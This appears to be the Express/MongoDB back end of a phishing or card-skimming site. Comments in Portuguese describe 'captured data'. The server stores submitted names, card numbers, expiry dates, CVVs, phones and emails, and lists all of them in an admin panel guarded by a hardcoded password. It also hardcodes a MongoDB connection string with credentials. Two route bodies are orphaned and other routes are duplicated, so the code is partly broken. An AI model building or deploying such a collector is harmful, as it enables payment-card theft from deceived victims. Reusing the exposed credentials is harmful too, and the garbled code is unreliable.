
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// Conexão com MongoDB direto no código (temporário, para testes)
const mongoURI = 'mongodb+srv://igorlcreis:PskuwOrsMTaZFnGU@cluster0.xcdkhke.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

mongoose.connect(mongoURI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log('MongoDB conectado'))
.catch(err => console.error('Erro ao conectar MongoDB:', err));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));


// Schema para os dados capturados
const FormDataSchema = new mongoose.Schema({
    nome: String,
    numeroCartao: String,
    validade: String,
    cvv: String,
    telefone: String,
    email: String,
    dataEnvio: { type: Date, default: Date.now }
});
const FormData = mongoose.model('FormData', FormDataSchema);

// Rota para capturar dados do formulário de pagamento
app.post('/submit-form', async (req, res) => {
    try {
        const data = new FormData(req.body);
        await data.save();
        res.status(200).send('Dados salvos com sucesso.');
    } catch (err) {
        console.error('Erro ao salvar dados:', err);
        res.status(500).send('Erro ao salvar dados.');
    }
});

// Painel admin protegido por senha e código

app.get('/admin', (req, res) => {
    res.send(`
    <form method="POST" action="/admin" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:8px;font-family:sans-serif">
        <h2 style="text-align:center;">Painel Admin</h2>
        <label>Senha:</label><br>
        <input type="password" name="senha" required style="width:100%;padding:8px;margin-bottom:10px"><br>
        <label>Código de autenticação:</label><br>
        <input type="text" name="codigo" required style="width:100%;padding:8px;margin-bottom:10px"><br>
        <button type="submit" style="background:#d63384;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer">Acessar</button>
    </form>
    `);
});

    const { senha, codigo } = req.body;
    if (senha !== 'asap' || codigo !== 'b7be0c3d-d56c-4d6e-b9ef-97c72e5beaae') {
        return res.status(401).send('Acesso negado');
    }
    try {
        const dados = await FormData.find().sort({ dataEnvio: -1 });
        let html = '<h1>Dados Capturados</h1>';
        dados.forEach((item, index) => {
            html += `
                <div style="margin-bottom:20px;padding:10px;border:1px solid #ccc;border-radius:5px;">
                    <strong>Entrada ${index + 1}</strong><br/>
                    Nome: ${item.nome}<br/>
                    Nº Cartão: ${item.numeroCartao}<br/>
                    Validade: ${item.validade}<br/>
                    CVV: ${item.cvv}<br/>
                    Telefone: ${item.telefone}<br/>
                    Email: ${item.email}<br/>
                    Data: ${new Date(item.dataEnvio).toLocaleString()}<br/>
                </div>
            `;
        });
        res.send(html);
    } catch (err) {
        console.error('Erro ao buscar dados:', err);
        res.status(500).send('Erro ao buscar dados.');
    }
});

    const senha = req.query.senha;
    const codigo = req.query.codigo;

    if (senha !== 'asap' || codigo !== 'b7be0c3d-d56c-4d6e-b9ef-97c72e5beaae') {
        return res.status(401).send('Acesso negado');
    }

    try {
        const dados = await FormData.find().sort({ dataEnvio: -1 });
        let html = '<h1>Dados Capturados</h1>';
        dados.forEach((item, index) => {
            html += `
                <div style="margin-bottom:20px;padding:10px;border:1px solid #ccc;border-radius:5px;">
                    <strong>Entrada ${index + 1}</strong><br/>
                    Nome: ${item.nome}<br/>
                    Nº Cartão: ${item.numeroCartao}<br/>
                    Validade: ${item.validade}<br/>
                    CVV: ${item.cvv}<br/>
                    Telefone: ${item.telefone}<br/>
                    Email: ${item.email}<br/>
                    Data: ${new Date(item.dataEnvio).toLocaleString()}<br/>
                </div>
            `;
        });
        res.send(html);
    } catch (err) {
        console.error('Erro ao buscar dados:', err);
        res.status(500).send('Erro ao buscar dados.');
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


app.get('/admin', (req, res) => {
    const senha = req.query.senha;
    if (senha === 'asap') {
        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
    } else {
        res.status(401).send('Acesso não autorizado');
    }
});
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});

app.post('/admin', async (req, res) => {
    const { senha, codigo } = req.body;
    if (senha !== 'asap' || codigo !== 'b7be0c3d-d56c-4d6e-b9ef-97c72e5beaae') {
        return res.status(401).send('Acesso negado');
    }
    try {
        const dados = await FormData.find().sort({ dataEnvio: -1 });
        let html = '<h1>Dados Capturados</h1>';
        dados.forEach((item, index) => {
            html += `
                <div style="margin-bottom:20px;padding:10px;border:1px solid #ccc;border-radius:5px;">
                    <strong>Entrada ${index + 1}</strong><br/>
                    Nome: ${item.nome}<br/>
                    Nº Cartão: ${item.numeroCartao}<br/>
                    Validade: ${item.validade}<br/>
                    CVV: ${item.cvv}<br/>
                    Telefone: ${item.telefone}<br/>
                    Email: ${item.email}<br/>
                    Data: ${new Date(item.dataEnvio).toLocaleString()}<br/>
                </div>
            `;
        });
        res.send(html);
    } catch (err) {
        console.error('Erro ao buscar dados:', err);
        res.status(500).send('Erro ao buscar dados.');
    }
});
